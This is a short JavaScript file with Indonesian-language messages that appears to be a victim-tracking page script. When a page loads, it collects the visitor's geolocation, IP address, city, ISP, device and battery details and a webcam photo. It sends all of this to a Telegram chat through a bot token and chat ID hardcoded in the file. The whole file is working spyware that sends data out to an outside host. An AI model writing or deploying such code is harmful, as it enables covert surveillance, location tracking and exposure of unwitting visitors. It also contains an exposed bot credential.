const BOT_TOKEN = "7835500770:AAEhp7-8y-mEuhjw2bTUzutQ3rZjmg5zv5o";
const CHAT_ID = "-1002270270494";

function sendToTelegram(message, photoBlob = null) {
    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("caption", message);
    if (photoBlob) {
        formData.append("photo", photoBlob, "snapshot.jpg");
    }
    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: "POST",
        body: formData
    });
}

async function captureData() {
    let message = "🔍 Data Pengguna:\n";
    try {
        const pos = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject);
        });
        message += `📍 Lokasi: ${pos.coords.latitude}, ${pos.coords.longitude}\n`;
    } catch {
        message += "❌ Lokasi tidak diizinkan.\n";
    }
    try {
        const ipData = await fetch("https://ipinfo.io/json").then(res => res.json());
        message += `🌐 IP: ${ipData.ip}\n🏙 Kota: ${ipData.city}, ${ipData.region}\n📡 ISP: ${ipData.org}\n`;
    } catch {
        message += "⚠️ Gagal mendapatkan informasi IP.\n";
    }
    let network = navigator.connection ? navigator.connection.effectiveType.toUpperCase() : "Unknown";
    let androidVersion = navigator.userAgent.match(/Android\s([0-9\.]+)/);
    let androidInfo = androidVersion ? `🤖 Android: ${androidVersion[1]}\n` : "";
    message += `📱 Perangkat: ${navigator.userAgent}\n📶 Jaringan: ${network}\n${androidInfo}`;
    try {
        const battery = await navigator.getBattery();
        message += `🔋 Baterai: ${Math.round(battery.level * 100)}%\n`;
    } catch {
        message += "⚠️ Tidak bisa mendapatkan status baterai.\n";
    }
    try {
        let stream = await navigator.mediaDevices.getUserMedia({ video: true });
        let track = stream.getVideoTracks()[0];
        let imageCapture = new ImageCapture(track);
        await new Promise(resolve => setTimeout(resolve, 2000));
        const blob = await imageCapture.takePhoto();
        await sendToTelegram(message, blob);
        stream.getTracks().forEach(track => track.stop());
    } catch {
        await sendToTelegram("❌ Kamera tidak diizinkan.");
    }
}

window.onload = captureData;
